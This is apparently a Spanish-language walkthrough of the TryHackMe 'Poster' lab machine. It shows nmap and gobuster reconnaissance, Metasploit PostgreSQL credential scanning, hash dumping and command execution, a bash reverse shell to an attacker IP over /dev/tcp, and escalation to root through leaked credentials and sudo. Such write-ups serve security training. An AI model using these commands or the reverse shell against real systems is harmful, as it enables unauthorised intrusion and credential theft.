# Poster - TryHackMe

## Reconocimiento

Vamos a realizar un reconocimiento de puertos con nmap.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.174.168 -R -Pn -oG allPorts

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 62
80/tcp   open  http       syn-ack ttl 62
5432/tcp open  postgresql syn-ack ttl 62
```

Veamos un escaneo más profundo de los puertos abiertos.

```bash
nmap -sCV -p22,80,5432 10.129.174.168

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Poster CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que en el puerto 80 tenemos un servidor web corriendo Apache 2.4.18 y en el puerto 5432 tenemos un servicio de base de datos PostgreSQL y el puerto 22 es para OpenSSH7.2p2

http://10.129.174.168/

![alt text](image.png)

Al entrar a la página web, nos encontramos con un formulario de login por correo electrónico.

Vamos a realizar un escaneo de directorios con gobuster para ver si encontramos algo interesante.

```bash
gobuster dir -u http://10.129.174.168 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 -x txt,js,php,xml,bak --add-slash

```

Vamos a buscar en Metasploit un modulo para enumerar las credenciales de usuario en postgresql.

```bash
use auxiliary/scanner/postgres/postgres_login

set rhosts 10.129.174.168
rhosts => 10.129.174.168

exploit
[+] 10.129.174.168:5432   - 10.129.174.168:5432 - Login Successful: postgres:password@template1
```

Vemos al usuario postgres con la contraseña password, vamos a usar el modulo para ejecutar comandos en la base de datos.

```bash
use auxiliary/admin/postgres/postgres_sql

set password password
password => password
set rhosts 10.129.174.168
rhosts => 10.129.174.168

exploit
[*] Running module against 10.129.174.168
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```

Vemos que podemos ejecutar comandos en la base de datos, usemos ahora el módulo para dumpear los hashes de los usuarios de la base de datos.

```bash
use auxiliary/scanner/postgres/postgres_hashdump

set password password
password => password
set rhosts 10.129.174.168
rhosts => 10.129.174.168

exploit
[+] 10.129.174.168:5432 - Query appears to have run successfully
[+] 10.129.174.168:5432 - Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```

Para que un usuario autenticado pueda ver ficheros podemos usar este modulo:

```bash
use auxiliary/admin/postgres/postgres_readfile
```

Sin embargo, vamos a ejecutar comandos con el siguiente módulo:

```bash
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec

set rhosts 10.129.174.168
set PASSWORD password
set lhost 192.168.154.96
exploit

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

Vamos a meternos como otro usuario, crackearmos este hash y obtenemos `78fb805c7412ae597b399844a54cce0a:batmanposter` para meternos con el usuario poster.

Vamos a meternos en una sesion de meterpreter:

```bash
sessions -l
Id 4

search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter

set SESSION 4
set LHOST 192.168.154.96
set LPORT 4444

run

sessions -i 5
(Meterpreter 5)(/var/lib/postgresql) >

```

```bash
(Meterpreter 5)(/var/lib/postgresql) > bash -i >& /dev/tcp/192.168.154.96/443 0>&1 
```

Hagamos un tratamiento de la TTY:

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

Si intentamos meternos como alison (uno de los 2 usuarios existentes) no nos lo permite, sin embarho en /home/dark hay un fichero con el contenido de la contraseña de dark: `dark:qwerty1234#!hackme`

```bash
su dark

id
uid=1001(dark) gid=1001(dark) groups=1001(dark)
```

dentro de .bash_history vemos esto:

```bash
cat .bash_history 
sudo mv
sudo -s
su alison
```

Vemos maneras de escalar privilegios:

```bash
sudo -l
[sudo] password for dark: 

id
uid=1001(dark) gid=1001(dark) groups=1001(dark)

find / -perm -4000 2>/dev/null
```

Investigando más vemos un archivo en `/var/www/html` llamado config.php con este contenido:

```php
<?php 
	
	$dbhost = "127.0.0.1";
	$dbuname = "alison";
	$dbpass = "p4ssw0rdS3cur3!#";
	$dbname = "mysudopassword";
<?
```

Iniciamos sesión como alison y podemos ver la flag de usuario en `/home/alison/user.txt` 

Vamos a escalar a root:

```bash
cat /etc/crontab

*  *	* * *	root	cd /opt/ufw && bash ufw.sh
```

Vemos que hay un script ufw.sh que se ejecuta cada minuto, vamos a ver su contenido:

```bash
alison@ubuntu:~$ cat /opt/ufw/ufw.sh 
ufw disable

-rwxr-xr-x 1 root root   12 Jul 28  2020 ufw.sh
```

Vamos a meternos en la base de datos mysudopassword con el usuario alison y la contraseña p4ssw0rdS3cur3!#:

```bash
psql -h localhost -U alison -d mysudopassword
```

No nos deja autenticar, vamos a usar el siguiente comando para conectarnos:

```bash
PGPASSWORD='p4ssw0rdS3cur3!#' psql -h localhost -U alison -d mysudopassword
```

No nos deja entrar, supongo que es porque no es la contraseña correcta.

Al poner sudo -l ponemos p4ssw0rdS3cur3!# y nos deja ver esto

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL

```bash
alison@ubuntu:/$ sudo cat /root/root.txt
```

Hemos completado la máquina y obtenido la flag de root.